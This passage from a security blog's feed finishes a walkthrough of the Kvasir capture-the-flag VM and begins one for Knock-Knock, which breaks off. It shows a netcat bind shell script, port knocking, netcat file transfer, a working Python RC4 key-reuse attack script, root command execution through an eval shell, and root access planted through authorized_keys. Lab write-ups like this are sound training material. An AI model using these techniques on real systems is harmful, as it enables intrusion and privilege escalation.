From: <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#108;&#x6f;&#99;&#107;&#x65;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x34;&#x2e;&#x31;&#48;&#x30;">&#x6c;&#111;&#99;&#107;&#x65;&#64;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x34;&#x2e;&#x31;&#48;&#x30;</a>
~
Hi Terra,</p>

<p>I&rsquo;ve been playing with a port knocking daemon on my PC &ndash; see if you can use that to get a shell.
Let me know how it goes.</p>

<p>Regards,
Locke
```</p>

<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8001</h1>

<h1>scans will appear to be coming from 192.168.4.50 for</h1>

<h1>192.168.4.100</h1>

<p>root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 17:39 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
```</p>

<p>Only <code>tcp/22</code>. :s</p>

<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>

<p><code>bash
terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
</code></p>

<p>The nmap after the knock:</p>

<p>```bash
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 17:45 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds</p>

<p>```</p>

<p>A new port! <code>tcp/1111</code> :) Lets check it out.</p>

<p>```bash
root@kali:~# proxychains nc 192.168.4.100 1111
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<h1>a new connection has no output. Only after typing</h1>

<h1>&lsquo;crap&rsquo; do you realise you have a sh session open</h1>

<p>id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
```</p>

<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>

<p><img class="<a" src="href="https://i.imgur.com/u2klDxc.png">https://i.imgur.com/u2klDxc.png</a>"></p>

<h2>busting kefka</h2>

<p>The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>

<p>```bash
cat littleShell.sh</p>

<h1>!/bin/sh</h1>

<p>/bin/nc -lnp 1111 -e &lsquo;/bin/sh&rsquo;
```</p>

<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>

<p><code>bash
pwd
/home/locke
ls -lh
total 332K
-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
</code></p>

<p>The <code>note.txt</code> file:</p>

<p><code>bash
cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
</code></p>

<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>

<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>

<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>

<p>```bash
root@kali:~# tar xvf diskimage.tar.gz
diskimage</p>

<p>root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID &ldquo;MSDOS5.0&rdquo;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes > 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
```</p>

<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>

<p>```bash
root@kali:~# mount diskimage /mnt/</p>

<p>root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .
drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar</p>

<h1>oh! a .rar? Lets extract&hellip;</h1>

<p>root@kali:~# unrar x /mnt/Secret.rar</p>

<p>UNRAR 4.10 freeware      Copyright &copy; 1993-2012 Alexander Roshal</p>

<p>Extracting from /mnt/Secret.rar</p>

<p>Enter password (will not be echoed) for MyPassword.txt:</p>

<p>No files to extract
```</p>

<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>

<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>

<p><img class="<a" src="href="https://i.imgur.com/SBIbnMU.png">https://i.imgur.com/SBIbnMU.png</a>"></p>

<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>

<p>It sounded like this:</p>

<p><img class="<a" src="href="https://i.imgur.com/IbdKBKR.gif">https://i.imgur.com/IbdKBKR.gif</a>"></p>

<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>

<p><img class="<a" src="href="https://i.imgur.com/7bxW0Xc.png">https://i.imgur.com/7bxW0Xc.png</a>"></p>

<p><em>OrcWQi5VhfCo</em>. Was this the password for the <code>.rar</code> archive?</p>

<p>```bash
root@kali:~# unrar x /mnt/Secret.rar</p>

<p>UNRAR 4.10 freeware      Copyright &copy; 1993-2012 Alexander Roshal</p>

<p>Extracting from /mnt/Secret.rar</p>

<p>Enter password (will not be echoed) for MyPassword.txt:</p>

<p>Extracting  MyPassword.txt                                            OK
All OK
root@kali:~# cat MyPassword.txt
5224XbG5ki2C
```</p>

<p>Yep! However, another random string. Remembering the note about this being a disk image from <code>kefka</code>, I attempted to SSH into <strong>192.168.4.100</strong> as <code>kefka</code> with this password:</p>

<p>```bash
root@kali:~# proxychains ssh -D 8002 <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x6b;&#101;&#x66;&#107;&#97;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#x34;&#46;&#49;&#48;&#48;">&#x6b;&#x65;&#x66;&#x6b;&#97;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x34;&#46;&#x31;&#48;&#48;</a>
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x6b;&#x65;&#x66;&#107;&#x61;&#64;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#x34;&#46;&#x31;&#x30;&#x30;">&#x6b;&#x65;&#102;&#x6b;&#97;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x34;&#x2e;&#49;&#x30;&#x30;</a>&rsquo;s password: # entered 5224XbG5ki2C
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
kefka@adm:~$
```</p>

<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>

<h2>taking the last ride to the flag</h2>

<p>Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>

<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>

<p>```bash
kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File &ldquo;/opt/wep2.py&rdquo;, line 93, in <module></p>

<pre><code>sock, addr = s.accept()
</code></pre>

<p>  File &ldquo;/usr/lib/python2.7/socket.py&rdquo;, line 202, in accept</p>

<pre><code>sock, addr = self._sock.accept()
</code></pre>

<p>KeyboardInterrupt
kefka@adm:~$
```</p>

<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8002</h1>

<h1>connections will appear to be coming from localhost</h1>

<p>root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
127.0.0.1: inverse host lookup failed:</p>

<h1>(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress</h1>

<h1>Can you retrieve my secret..?</h1>

<p>Usage:
&lsquo;V&rsquo; to view the encrypted flag
&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</p>

<p>V
5a5062:36507a63b56865f7fd201860
^C
root@kali:~#
```</p>

<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>

<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>

<p><code>bash
E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
</code></p>

<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>

<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>

<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>

<h3>understanding what WEP actually is</h3>

<p>With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>

<p>Some resources that really helped me get to grips with what we are facing here was:
 <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
 <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
 <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
 <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>

<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>

<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>

<p><strong>C = P ^ RC4(iv, k)</strong></p>

<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>

<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>

<h3>attacking the encryption game</h3>

<p>Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>

<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>

<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>

<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>

<p>```bash
root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
[+] Generating base iv:cy dictionary with &lsquo;A&rsquo; <em>24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &lsquo;B&rsquo; </em>24
[+] Frame matched IV of 929d87 in 4559 tries!
[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48</p>

<p>[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
```</p>

<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>

<p>With the changes in, I ended up with the following script:</p>

<p>```bash</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir RC4 Key Re-use Attack</h1>

<p>import socket</p>

<h1>start a fresh iv_dict used for lookups</h1>

<p>iv_dict = {}</p>

<h1>connection to the thing</h1>

<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&lsquo;127.0.0.1&rsquo;, 1234))</p>

<h1>read the banner so we can continue</h1>

<h1>=============================</h1>

<h1>Can you retrieve my secret..?</h1>

<h1>=============================</h1>

<h1></h1>

<h1>Usage:</h1>

<h1>&lsquo;V&rsquo; to view the encrypted flag</h1>

<h1>&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</h1>

<p>banner = sock.recv(1024)</p>

<h1>create some iv:cyper combinations of the flag</h1>

<p>print &lsquo;[+] Generating base iv:cy dictionary&rsquo;
for i in range(0,5000):</p>

<pre><code>sock.send('V\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1]

# add the values
iv_dict[iv] = cy.strip()
</code></pre>

<p>print &lsquo;[+] The iv_dict knows about %d combinations&rsquo; % len(iv_dict)</p>

<h1>start processing the second string, looking up the IV</h1>

<p>print &lsquo;[+] Starting Bruteforce with \'B\&rsquo; *24'
count = 0
while True:</p>

<pre><code>count += 1
sock.send('E ' + 'B' *24 + '\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1].strip() # annoying \n

if iv in iv_dict:
    print '[+] Frame matched IV of %s in %d tries!' % (iv, count)
    print '[+] Base Cyper Text was: %s' % iv_dict[iv]
    print '[+] Matched Cypher Text: %s' % cy

    # first XOR to get the keystream for this IV
    keystream = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode("hex"),'B'*24))
    print '[+] Keystream: %s' % keystream.encode("hex")

    # then decode second cypher text using the keystream for the cleartext
    decrypted = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode("hex"),keystream))
    print '[+] Decrytped flag is: %s' % decrypted
    break

# progress incase things take longer than expected
if count % 100000 == 0:
    print '[+] Tries: %d' % count
</code></pre>

<p>print &lsquo;[+] Done&rsquo;
sock.close()
```</p>

<p>In no time at all, the above code outputs the decrypted flag:</p>

<p><code>bash
root@kali:~# proxychains ./un_wep.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary
[+] The iv_dict knows about 5000 combinations
[+] Starting Bruteforce with 'B' *24
[+] Frame matched IV of 06f39e in 1696 tries!
[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
[+] Decrytped flag is: 0W6U6vwG4W1V
[+] Done
</code></p>

<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>

<h2>finally getting the flag, sort of&hellip;</h2>

<p>I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>

<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>

<p>```bash
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
127.0.0.1: inverse host lookup failed:</p>

<h1>(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress</h1>

<h1>Can you retrieve my secret..?</h1>

<p>Usage:
&lsquo;V&rsquo; to view the encrypted flag
&lsquo;E&rsquo; to encrypt a plaintext string (e.g. &lsquo;E AAAA&rsquo;)</p>

<p>0W6U6vwG4W1V</p>

<blockquote><p>```</p></blockquote>

<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>

<p>```bash</p>

<blockquote><p>ls
id
whoami
ls -lah
uname -a
help
?</p>

<p>```</p></blockquote>

<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>

<p>```bash
kefka@adm:~$ sudo /opt/wep2.py
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;ls&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;whoami&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;ls&rsquo; is not defined
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
NameError: name &lsquo;uname&rsquo; is not defined
  File &ldquo;<string>&rdquo;, line 1</p>

<pre><code>?
^
</code></pre>

<p>SyntaxError: invalid syntax
Traceback (most recent call last):
  File &ldquo;/opt/wep2.py&rdquo;, line 94, in <module></p>

<pre><code>handler(sock, addr)
</code></pre>

<p>  File &ldquo;/opt/wep2.py&rdquo;, line 74, in handler</p>

<pre><code>sock.send(p1)
</code></pre>

<p>socket.error: [Errno 32] Broken pipe
kefka@adm:~$
```</p>

<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>

<p>```bash
0W6U6vwG4W1V</p>

<blockquote><p>import os; os.system(&lsquo;id&rsquo;);
uid=0(root) gid=0(root) groups=0(root)
```</p></blockquote>

<p>Yay :) I went straight for the <code>cat /root/flag</code>:</p>

<p>```bash</p>

<blockquote><p>import os; os.system(&lsquo;cat /root/flag&rsquo;);</p>

<pre><code>_  __                             _            
</code></pre>

<p>   | |/ /   <strong> </strong>   <strong> _     </strong><em>     (</em>)      _ <em><br/>
   | &lsquo; &lt;    \ I /  / </em><code>|   (_-&lt;     | |     | '_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
  "</code>-0-0-&rsquo;&ldquo;<code>-0-0-'"</code>-0-0-&lsquo;&rdquo;<code>-0-0-'"</code>-0-0-&rsquo;&ldquo;`-0-0-'</p></blockquote>

<p>Pbatenghyngvbaf ba orngvat Xinfve &ndash; V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
gur Zrnq bs Cbrgel&hellip;</p>

<p>Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.</p>

<p>Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.</p>

<p>  enfgn_zbhfr(@_EnfgnZbhfr)</p>

<blockquote><p>```</p></blockquote>

<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&rsquo;d in as root:</p>

<p>```bash
root@kali:~# proxychains ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;">&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a> -i kvasir_key
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 16:57:16 2014 from localhost
root@adm:~#
```</p>

<h2>the final troll</h2>

<p>With the <code>/root/flag</code> in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with <code>decode()</code> again:</p>

<p>```bash
root@adm:~# python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>with open(&lsquo;/root/flag&rsquo;) as f:
&hellip;     flag = f.read()
&hellip;
print flag.decode(&lsquo;rot13&rsquo;)</p>

<pre><code>_  __                             _            
</code></pre>

<p>   | |/ /   <strong> </strong>   <strong> _     </strong><em>     (</em>)      _ <em><br/>
   | &lsquo; &lt;    \ V /  / </em><code>|   (_-&lt;     | |     | '_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
  "</code>-0-0-&rsquo;&ldquo;<code>-0-0-'"</code>-0-0-&lsquo;&rdquo;<code>-0-0-'"</code>-0-0-&rsquo;&ldquo;`-0-0-'</p></blockquote></blockquote></blockquote>

<p>Congratulations on beating Kvasir &ndash; I hope you enjoyed
the ride.  Take his blood, mix with honey and drink
the Mead of Poetry&hellip;</p>

<p>Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.</p>

<p>Feel free to ping me with thoughts/comments on
<a href="http://wi-fu.co.uk,">http://wi-fu.co.uk,</a> #VulnHub IRC or Twitter.</p>

<p>  rasta_mouse(@_RastaMouse)</p>

<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

<h2>conclusion</h2>

<p>Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>

<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[knock-knock who’s there?]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/"/>
    <updated>2014-10-14T09:14:26+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<!--more-->


<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<p>```bash
$ sudo nmap -sN 192.168.56.0/24</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 09:51 SAST
Nmap scan report for 192.168.56.1
Host is up (0.000030s latency).
All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)</p>

<p>Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
```</p>

<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<p>```bash
$ arp -i vboxnet0 -a
? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
```</p>

<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<p>```bash
